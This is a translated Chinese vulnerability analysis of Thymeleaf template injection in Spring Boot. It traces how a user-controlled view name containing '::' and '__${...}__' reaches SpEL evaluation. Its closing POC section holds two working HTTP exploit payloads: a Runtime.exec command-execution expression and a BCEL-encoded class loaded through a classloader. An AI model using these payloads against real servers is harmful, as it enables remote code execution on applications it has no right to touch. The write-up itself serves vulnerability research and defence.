# Spring Boot Thymeleaf SSTI漏洞分析

## 译文声明
本文是翻译文章，仅供参考。具体内容和含义以原文为准。

Thymeleaf模板注入在Spring Boot环境下是一个有趣且值得关注的漏洞。本文将深入探讨这一漏洞，并使用以下项目提供的示例进行调试分析：
`https://github.com/veracode-research/spring-view-manipulation`
其中，使用的`spring-boot`版本为`2.2.0.RELEASE`。

## 启动

### 自动装配
在配置好Spring Boot的情况下，只需添加Thymeleaf的Maven依赖即可实现自动配置。
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-thymeleaf</artifactId>
</dependency>
```
Thymeleaf的自动配置类为`org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration`。

### 视图解析器排序
在`ContentNegotiatingViewResolver`的初始化过程中，会初始化多个视图解析器（包括模板引擎），如`BeanNameViewResolver`、`ViewResolverComposite`、`InternalResourceViewResolver` 和 `ThymeleafViewResolver`。查看`ThymeleafViewResolver`源码，发现其`order`值为`Integer.MAX_VALUE`，经过排序后的结果如下所示（`BeanNameViewResolver`同样为`Integer.MAX_VALUE`）：

具体代码流可以参考这里的堆栈信息：
- `getOrder:282, ThymeleafViewResolver (org.thymeleaf.spring5.view)`
- ...
- `initServletContext:206, ContentNegotiatingViewResolver (org.springframework.web.servlet.view)`
- ...
- `refresh:550, AbstractApplicationContext (org.springframework.context.support)`
- ...
- `refreshContext:397, SpringApplication (org.springframework.boot)`
- `run:315, SpringApplication (org.springframework.boot)`

## 视图解析

### 获取视图解析器
当用户发起请求时，`DispatcherServlet`中的`render`方法会获取视图解析器，并通过`resolveViewName`方法获得最匹配的视图解析器。
在`ContentNegotiatingViewResolver`的`resolveViewName`方法中，首先筛选出有效的视图解析器，然后通过`getBestView`方法选取最优解。`getBestView`方法优先返回重定向的视图动作，再根据用户HTTP请求的`Accept:`头部字段与视图解析器的排序来决定最优解。

### 获取视图解析器名称
`RequestMappingHandlerAdapter`中的`invokeHandlerMethod`方法是获取视图名称的关键点。该方法会调用`invokeAndHandle`，并返回`getModelAndView`方法的结果。
在`ServletInvocableHandlerMethod`的`invokeAndHandle`方法中，会尝试获取前端控制器的返回值。如果控制器直接拼接了用户的输入，则相当于控制了视图名称。如果用户自定义的Controller方法的入参中添加了`ServletResponse`，则会导致`getModelAndView`返回`null`。

如果前端Controller的方法返回值为`null`，即`void`类型，前面的流程无法拿到视图名称，后面会调用`applyDefaultViewName`方法将URI路径作为视图名称。
在`DefaultRequestToViewNameTranslator`的`transformPath`方法中，会对URI进行格式调整，包括去除URI扩展名。

### 使用视图解析器
`ThymeleafView`的`renderFragment`方法是触发漏洞的关键逻辑点之一。如果用户的输入拼接到视图名称中，即控制了`viewTemplateName`变量。通过浏览代码，我们可以了解到，视图模板名称中需要包含`::`字符串，否则不会进入表达式执行代码中。

在`StandardExpressionParser`的`parseExpression`方法中，会走到`StandardExpressionPreprocessor`的`preprocess`方法。这里的`input`变量就是`viewTemplateName`前后分别拼接了`~{`和`}`后的字符串。随后使用正则表达式`\_\_(.*?)\_\_`对`input`进行匹配，并获取非贪婪匹配的内容。最后将该内容传入`parseExpression`方法，从而触发EL表达式代码执行。

## POC构造
由触发的代码流程梳理可以得出触发表达式的条件：
1. 用户传入的字符串拼接到Controller方法的返回值中且返回的视图非重定向，或URI路径拼接了用户的输入且Controller方法参数中不带有`ServletResponse`类型的参数；
2. 视图引擎名称中需要包含`::`字符串；
3. 被执行表达式字符串前后需要带有两个下划线，即`__${EL}__`；
4. 如果Payload在URI中，由于URI格式化的原因且我们的Payload中带有`.`符号，所以需要在URI末尾添加`.`。

于是，我们可以构造出如下POC：
```http
POST /path HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

lang=::__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc").getInputStream()).next()}_______________
```

如果要利用该漏洞执行更复杂的操作，建议结合BCEL等技术（不过JDK 251后BCEL无法使用）。例如，在Windows上弹出计算器：
```http
POST /path HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 1010

lang=::__${"".getClass().forName("$$BCEL$$$l$8b$I$A$A$A$A$A$A$AePMO$c2$40$U$9c$85B$a1$W$84$e2$f7$b7$t$c1$83$3dx$c4x1z$b1$w$R$83$e7$ed$b2$c1$c5$d2$92R$8c$fe$o$cf$5e$d4x$f0$H$f8$a3$8c$af$x$R$a3$7bx$_o$e6$cdL$de$7e$7c$be$bd$D$d8$c7$b6$F$Ts$W$e6$b1P$c0b$da$97L$y$9bX1$b1$ca$90$3fP$a1J$O$Z$b2$f5F$87$c18$8a$ba$92a$d6S$a1$3c$l$P$7c$Z_q$3f$m$c4$f1$o$c1$83$O$8fU$3aO$40$p$b9Q$a3$94$T$d1$c0$f5$a5$I$dc$W$7f$I$o$dem2$U$OD0$b1$$$b5$T$$n$cf$f8P$cb$u$9c$c1jG$e3X$c8$T$95$da$d8$T$d5$5e$9f$dfq$h$F$UM$ac$d9X$c7$GEP$aa$b0$b1$89$z$86Z$ca$bb$B$P$7b$ee$f1$bd$90$c3DE$nC$e5o8A$d3$c5$L$bf$_E$c2P$9dB$97$e30Q$D$ca$b5z2$f9$Z$e6$eb$N$ef$df$O$dda$c8$7b$v$Yv$ea$bf$d8v$S$ab$b0$d7$fc$zh$c5$91$90$a3Q$T$db$c8$d3$7f$a7$_$D$96$deB$d5$a2$c9$a5$ce$a8$e7v_$c0$9e4$3dC5$af$c1$Ml$aa$f6$f7$CJ$uS$_$60$f6G$7c$a1$cd$80$f2$x2N$f6$Z$c6$f5$p$8c$d3$t$8d$VI$97CV$bb90$a8$9a$84YH$3f$b2D$a8$ad$fd$81$8af2$9e$89$wH$e8h$b8$f6$Fz7$85$d0$t$C$A$A", true, "".getClass().forName("com.sun.org.apache.bcel.internal.util.ClassLoader").newInstance())}_______________
```

## 结语
Spring Boot的自动化配置为开发部署带来了极大的便捷，但也提高了我们深入底层问题的学习成本。该模板注入问题十分巧妙，起初让人感到不可思议。